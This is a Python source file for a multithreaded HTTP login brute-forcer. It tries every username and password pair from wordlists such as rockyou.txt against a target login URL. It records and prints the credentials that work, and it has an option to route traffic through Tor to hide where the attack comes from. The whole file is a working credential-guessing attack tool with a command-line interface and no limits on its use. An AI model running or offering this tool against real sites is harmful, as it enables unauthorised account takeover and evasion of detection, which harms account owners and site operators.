import os
import threading
import queue
import requests
from concurrent.futures import ThreadPoolExecutor
from utils.logger import save_hit, log_event
from config import WORDLIST_DIR, MAX_THREADS, USE_TOR, TOR_SOCKS_PROXY

class BruteForcer:
    def __init__(self, target_url, usernames_file, passwords_file,
                 max_threads=MAX_THREADS, use_tor=USE_TOR):
        self.target_url = target_url.rstrip('/')
        self.usernames = self._load_list(usernames_file)
        self.passwords = self._load_list(passwords_file)
        self.max_threads = max_threads
        self.session = self._init_session(use_tor)
        self.attempts = queue.Queue()
        self.lock = threading.Lock()

    def _init_session(self, use_tor):
        sess = requests.Session()
        if use_tor:
            sess.proxies.update({
                'http': f'socks5h://{TOR_SOCKS_PROXY}',
                'https': f'socks5h://{TOR_SOCKS_PROXY}',
            })
        return sess

    def _load_list(self, filepath):
        path = os.path.join(WORDLIST_DIR, filepath)
        if not os.path.isfile(path):
            raise FileNotFoundError(f"Wordlist not found: {path}")
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]

    def _worker(self):
        while True:
            try:
                user, pwd = self.attempts.get_nowait()
            except queue.Empty:
                return
            payload = {'username': user, 'password': pwd}
            try:
                resp = self.session.post(self.target_url, data=payload, timeout=10)
                if resp.status_code == 200 and "login failed" not in resp.text.lower():
                    # Success!
                    save_hit(user, pwd)
                    log_event("brute", {
                        "target": self.target_url,
                        "result": "success",
                        "user": user,
                        "password": pwd
                    })
                    print(f"[+] Valid credentials: {user}:{pwd}")
                    # Optionally stop on first success
                    # return
                else:
                    log_event("brute", {
                        "target": self.target_url,
                        "result": "fail",
                        "user": user,
                        "password": pwd
                    })
            except Exception as e:
                with self.lock:
                    print(f"[!] Error for {user}:{pwd} → {e}")
            finally:
                self.attempts.task_done()

    def run(self):
        # Populate queue
        for user in self.usernames:
            for pwd in self.passwords:
                self.attempts.put((user, pwd))

        print(f"[*] Starting brute‐force on {self.target_url} "
              f"with {self.attempts.qsize()} attempts using {self.max_threads} threads.")

        # Launch thread pool
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for _ in range(self.max_threads):
                executor.submit(self._worker)

        self.attempts.join()
        print("[*] Brute‐force complete.")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Concurrent HTTP Brute-Forcer")
    parser.add_argument("url", help="Target login URL (e.g. https://site.com/login)")
    parser.add_argument("-U", "--users", default="usernames.txt",
                        help="Filename of usernames list")
    parser.add_argument("-P", "--pwds", default="rockyou.txt",
                        help="Filename of passwords list")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Max concurrent threads")
    parser.add_argument("--tor", action="store_true",
                        help="Route traffic through Tor")
    args = parser.parse_args()

    bf = BruteForcer(
        target_url=args.url,
        usernames_file=args.users,
        passwords_file=args.pwds,
        max_threads=args.threads,
        use_tor=args.tor
    )
    bf.run()
